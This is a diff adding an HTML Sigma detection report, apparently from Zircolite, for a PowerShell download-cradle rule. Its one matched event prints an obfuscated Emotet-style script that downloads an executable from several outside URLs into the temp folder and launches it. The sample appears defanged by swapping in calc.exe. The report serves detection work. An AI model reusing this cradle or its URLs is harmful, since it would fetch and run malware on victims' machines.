@@ -1,0 +1,54 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>PowerShell Web Download Cradle Via Script Block Logging</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin:0; font-family: 'Segoe UI', system-ui, sans-serif;
+         background:#0e1117; color:#e6edf3; padding:28px 32px; }
+  .brand { font-size:13px; letter-spacing:2px; color:#7d8590;
+            text-transform:uppercase; margin-bottom:4px; }
+  h1 { font-size:23px; margin:0 0 14px; color:#fff; }
+  .badges { margin-bottom:18px; }
+  .lvl { display:inline-block; padding:4px 12px; border-radius:5px;
+          font-weight:700; font-size:12px; letter-spacing:1px;
+          background:#b62324; color:#fff; margin-right:8px; }
+  .lvl.MEDIUM { background:#b5820b; }
+  .tag { display:inline-block; background:#21262d; color:#9db4d0;
+          padding:3px 9px; border-radius:4px; font-size:12px;
+          margin-right:6px; font-family:monospace; }
+  .summary { display:flex; gap:14px; margin-bottom:20px; flex-wrap:wrap; }
+  .stat { background:#161b22; border:1px solid #30363d; border-radius:8px;
+           padding:12px 18px; min-width:120px; }
+  .stat .n { font-size:26px; font-weight:700; color:#3fb950; }
+  .stat .l { font-size:11px; color:#7d8590; text-transform:uppercase;
+              letter-spacing:1px; margin-top:2px; }
+  .desc { background:#161b22; border-left:3px solid #388bfd;
+           padding:12px 16px; border-radius:0 6px 6px 0; margin-bottom:20px;
+           font-size:13px; color:#c9d1d9; line-height:1.5; max-width:1000px; }
+  .event { background:#161b22; border:1px solid #30363d; border-radius:8px;
+            margin-bottom:14px; overflow:hidden; }
+  .ev-hd { background:#1f6feb22; color:#79c0ff; padding:8px 14px;
+            font-size:13px; font-weight:600; border-bottom:1px solid #30363d; }
+  table.ev { width:100%; border-collapse:collapse; }
+  table.ev td { padding:7px 14px; border-bottom:1px solid #21262d;
+                 vertical-align:top; font-size:13px; }
+  td.k { color:#7d8590; width:180px; font-family:monospace; }
+  td.val { color:#e6edf3; font-family:monospace; }
+  td.long { font-size:11.5px; color:#f0d0a0; word-break:break-all; }
+  .foot { margin-top:18px; color:#7d8590; font-size:12px; }
+  code { color:#a5d6ff; }
+</style></head><body>
+  <div class="brand">Zircolite &middot; Sigma Detection Report</div>
+  <h1>PowerShell Web Download Cradle Via Script Block Logging</h1>
+  <div class="badges"><span class="lvl HIGH">HIGH</span><span class="tag">attack.execution</span> <span class="tag">attack.t1059.001</span></div>
+  <div class="summary">
+    <div class="stat"><div class="n">1</div><div class="l">Matches</div></div>
+    <div class="stat"><div class="n" style="color:#79c0ff">EID 4104</div><div class="l">Event ID</div></div>
+    <div class="stat"><div class="n" style="color:#d2a8ff;font-size:15px;padding-top:6px">T1059.001 Emotet (EID 4104)</div><div class="l">Test log</div></div>
+  </div>
+  <div class="desc">Detects PowerShell download cradles in Script Block Logging (EID 4104) that combine a<br>network-download primitive (Net.WebClient / DownloadFile / DownloadString / Invoke-WebRequest)<br>with an execution or in-memory follow-on (Invoke-Item, Invoke-Expression/IEX, Start-Process,<br>or a TLS SecurityProtocol pin). This is a common first-stage malware pattern (e.g. Emotet<br>downloaders). Sigma string matching is case-insensitive by default, so heavily mixed-case /<br>concatenation-obfuscated variants are matched without enumerating every casing.<br></div>
+  <div class="event"><div class="ev-hd">Matched event #1</div><table class="ev"><tr><td class="k">EventID</td><td class="val">4104</td></tr><tr><td class="k">Channel</td><td class="val">Microsoft-Windows-PowerShell/Operational</td></tr><tr><td class="k">ScriptBlockText</td><td class="val long">$Va5w3n8=((&#x27;Q&#x27;+&#x27;2h&#x27;)+(&#x27;w9p&#x27;+&#x27;1&#x27;));&amp;(&#x27;ne&#x27;+&#x27;w-&#x27;+&#x27;item&#x27;) $eNV:teMP\WOrd\2019\ -itemtype DIrectOry;[Net.ServicePointManager]::&quot;SecURi`T`ypRO`T`oCOL&quot; = (&#x27;t&#x27;+&#x27;ls&#x27;+&#x27;1&#x27;+(&#x27;2, tl&#x27;+&#x27;s&#x27;)+&#x27;11&#x27;+(&#x27;, &#x27;+&#x27;tls&#x27;));$Depssu0 = ((&#x27;D&#x27;+&#x27;yx&#x27;)+(&#x27;x&#x27;+&#x27;ur4g&#x27;)+&#x27;x&#x27;);$A74_j9r=(&#x27;T&#x27;+&#x27;4&#x27;+(&#x27;gf45&#x27;+&#x27;h&#x27;));$Fdkhtf_=$env:temp+((&#x27;{0}&#x27;+&#x27;word{&#x27;+&#x27;0}&#x27;+(&#x27;2&#x27;+&#x27;01&#x27;)+&#x27;9{0}&#x27;) -F [CHAr]92)+$Depssu0+(&#x27;.&#x27;+(&#x27;ex&#x27;+&#x27;e&#x27;));$O39nj1p=(&#x27;J6&#x27;+&#x27;9l&#x27;+(&#x27;hm&#x27;+&#x27;h&#x27;));$Z8i525z=&amp;(&#x27;new-&#x27;+&#x27;obje&#x27;+&#x27;c&#x27;+&#x27;t&#x27;) neT.WEbcLiENt;$Iwmfahs=((&#x27;h&#x27;+&#x27;ttp&#x27;)+(&#x27;:&#x27;+&#x27;//&#x27;)+(&#x27;q&#x27;+&#x27;u&#x27;+&#x27;anticaelectro&#x27;+&#x27;n&#x27;+&#x27;ic&#x27;)+(&#x27;s.com&#x27;+&#x27;/&#x27;)+&#x27;w&#x27;+&#x27;p-&#x27;+&#x27;a&#x27;+(&#x27;d&#x27;+&#x27;min&#x27;)+&#x27;/&#x27;+&#x27;7A&#x27;+(&#x27;Tr78&#x27;+&#x27;/*&#x27;+&#x27;htt&#x27;)+(&#x27;p&#x27;+&#x27;s:/&#x27;)+(&#x27;/r&#x27;+&#x27;e&#x27;)+&#x27;be&#x27;+(&#x27;l&#x27;+&#x27;co&#x27;)+&#x27;m&#x27;+&#x27;.&#x27;+(&#x27;ch/&#x27;+&#x27;pi&#x27;+&#x27;c&#x27;)+(&#x27;ture&#x27;+&#x27;_&#x27;)+(&#x27;l&#x27;+&#x27;ibra&#x27;+&#x27;ry/bbCt&#x27;)+(&#x27;l&#x27;+&#x27;S/&#x27;)+(&#x27;*ht&#x27;+&#x27;tp&#x27;+&#x27;s:/&#x27;)+(&#x27;/re&#x27;+&#x27;al&#x27;)+&#x27;e&#x27;+&#x27;s&#x27;+(&#x27;tate&#x27;+&#x27;a&#x27;)+(&#x27;gen&#x27;+&#x27;t&#x27;)+&#x27;te&#x27;+(&#x27;am.co&#x27;+&#x27;m&#x27;)+&#x27;/&#x27;+(&#x27;163/Q&#x27;+&#x27;T&#x27;)+&#x27;d&#x27;+(&#x27;/&#x27;+&#x27;*ht&#x27;+&#x27;tps:&#x27;)+&#x27;//&#x27;+(&#x27;w&#x27;+&#x27;ww.&#x27;)+(&#x27;ri&#x27;+&#x27;dd&#x27;)+(&#x27;hi&#x27;+&#x27;display.&#x27;+&#x27;c&#x27;+&#x27;o&#x27;)+&#x27;m/&#x27;+&#x27;r&#x27;+&#x27;id&#x27;+&#x27;d&#x27;+(&#x27;hi&#x27;+&#x27;/1pKY/&#x27;+&#x27;*htt&#x27;)+&#x27;p&#x27;+(&#x27;:&#x27;+&#x27;//&#x27;)+(&#x27;radi&#x27;+&#x27;osu&#x27;+&#x27;bmit.com/&#x27;+&#x27;sear&#x27;)+(&#x27;ch_&#x27;+&#x27;tes&#x27;+&#x27;t&#x27;)+&#x27;/&#x27;+&#x27;p&#x27;+(&#x27;/*&#x27;+&#x27;h&#x27;)+(&#x27;ttp&#x27;+&#x27;:/&#x27;)+&#x27;/&#x27;+(&#x27;res&#x27;+&#x27;e&#x27;)+&#x27;ar&#x27;+(&#x27;ch&#x27;+&#x27;c&#x27;)+&#x27;he&#x27;+&#x27;m&#x27;+(&#x27;plu&#x27;+&#x27;s.&#x27;+&#x27;c&#x27;)+(&#x27;om/w&#x27;+&#x27;p-&#x27;)+(&#x27;a&#x27;+&#x27;dmin&#x27;)+&#x27;/1&#x27;+(&#x27;OC&#x27;+&#x27;C&#x27;)+&#x27;/&#x27;+(&#x27;*http:&#x27;+&#x27;/&#x27;)+(&#x27;/s&#x27;+&#x27;zymo&#x27;)+(&#x27;ns&#x27;+&#x27;zyp&#x27;)+&#x27;er&#x27;+(&#x27;sk&#x27;+&#x27;i&#x27;)+(&#x27;.&#x27;+&#x27;pl/a&#x27;)+&#x27;ss&#x27;+(&#x27;ets/&#x27;+&#x27;p&#x27;)+&#x27;k/&#x27;).&quot;S`Plit&quot;([char]42);$Zxnbryr=((&#x27;Dp&#x27;+&#x27;z9&#x27;)+&#x27;4&#x27;+&#x27;a6&#x27;);foreach($Mqku5a2 in $Iwmfahs){try{$Z8i525z.&quot;d`OWN`load`FIlE&quot;($Mqku5a2, $Fdkhtf_);$Lt8bjj7=(&#x27;Ln&#x27;+(&#x27;wp&#x27;+&#x27;ag&#x27;)+&#x27;m&#x27;);If ((.(&#x27;Get-I&#x27;+&#x27;t&#x27;+&#x27;em&#x27;) $Fdkhtf_).&quot;le`NgTH&quot; -ge 28315) {cp (gcm calc).path $Fdkhtf_ -Force; .(&#x27;Invo&#x27;+&#x27;ke&#x27;+&#x27;-Item&#x27;)($Fdkhtf_);$Nfgrgu9=((&#x27;Qj6&#x27;+&#x27;bs&#x27;)+&#x27;x&#x27;+&#x27;n&#x27;);break;$D7ypgo1=(&#x27;Bv&#x27;+(&#x27;e&#x27;+&#x27;bc&#x27;)+&#x27;k0&#x27;)}}catch{}}$Gmk6zmk=((&#x27;Z2x&#x27;+&#x27;aaj&#x27;)+&#x27;0&#x27;)</td></tr><tr><td class="k">Computer</td><td class="val">DESKTOP-RIPCLIP</td></tr></table></div>
+  
+  <div class="foot">Rule ID <code>7344d6a1-f035-4997-9b19-40b13f8fddfd</code> &middot;
+     Sigma source <code></code> &middot;
+     Source log <code>exec_emotet_ps_4104.evtx</code></div>
+</body></html>
